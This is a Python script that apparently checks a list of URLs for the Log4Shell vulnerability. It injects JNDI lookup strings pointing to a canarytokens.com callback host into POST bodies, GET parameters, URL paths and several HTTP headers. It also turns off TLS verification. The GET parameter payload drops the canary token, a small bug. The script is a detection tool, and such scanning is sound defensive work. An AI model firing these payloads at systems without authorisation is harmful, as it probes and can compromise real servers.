#!/usr/bin/python3
import requests
import uuid
import logging
import urllib3
import time
import csv
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

CANARY_TOKEN = 'ujz5sgvgo7xuvn03ft9qrws5w'

def check_post_parameter(method: str, identifier: str, url: str, parameters: list[str], canarytoken: str):
    try:
        # Injects POST body parameters
        if method == "POST":
            # Generate POST body without url-encode (probably can be prettier)
            data = "{"
            for parameter in parameters:
                data += f"{parameter}=${{jndi:ldap://x{identifier}-{parameter}.L4J.{canarytoken}.canarytokens.com/a}}&"
            data = data[:-1]
            data += "}"

            r = requests.post(
                url,
                data=data,
                headers={
                    'Content-Type': 'text/plain', 
                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
                },
                verify=False
            )
            logging.info(f"Status code: {r.status_code} - POST")

        # Injects GET parameters
        elif method == "GET":
            data = {}
            for parameter in parameters:
                data[parameter] = f"${{jndi:ldap://x{identifier}-{parameter}.L4J..canarytokens.com/a}}"
            r = requests.get(
                url,
                headers={
                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
                },
                params=data,
                verify=False
            )
            logging.info(f"Status code: {r.status_code} - GET")

        # Injects URL without paramters (No Parameters)
        elif method == "GETNP":
            if url[-1] == "/":
                url = url[:-1]
            r = requests.get(
                f"{url}/${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
                headers={
                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
                },
                verify=False
            )
            logging.info(f"Status code: {r.status_code} - GET")


    except requests.exceptions.ConnectionError as e:
        logging.error(f"HTTP connection to {url} error: {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage python3 log4jcheck.py urls.csv")
        return

    filename = sys.argv[1]
    with open(filename) as csvfile:
        urlreader = csv.reader(csvfile)
        next(urlreader, None)  # skip the headers
        for row in urlreader:
            try:
                url_id = row[0]
                url = row[1]
                method = row[2]
                parameters = row[3].replace(" ", "").split(",") 
            except IndexError:
                logging.warning("Filename should be in the following format: URL info, URL, POST or GET, query parameters")
                continue

            if url != "":
                identifier = uuid.uuid4()
                logging.info(f"{identifier} : {url_id} : {url}")

                check_post_parameter(method, identifier, url, parameters, CANARY_TOKEN)

                # Sleep 1 second to not stress anything
                time.sleep(1)


if __name__ == "__main__":
    main()
